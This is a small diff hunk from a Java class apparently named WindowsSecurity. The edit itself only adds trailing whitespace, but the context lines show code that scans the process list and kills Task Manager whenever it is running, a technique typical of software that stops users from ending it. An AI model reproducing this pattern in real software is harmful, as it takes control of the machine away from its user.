@@ -123,7 +123,7 @@ public class WindowsSecurity implements Runnable {
                     pidInfo += line;
                 }
 
-                input.close();
+                input.close(); 
 
                 if (pidInfo.contains("Taskmgr.exe")) {
                     kill("Taskmgr.exe");
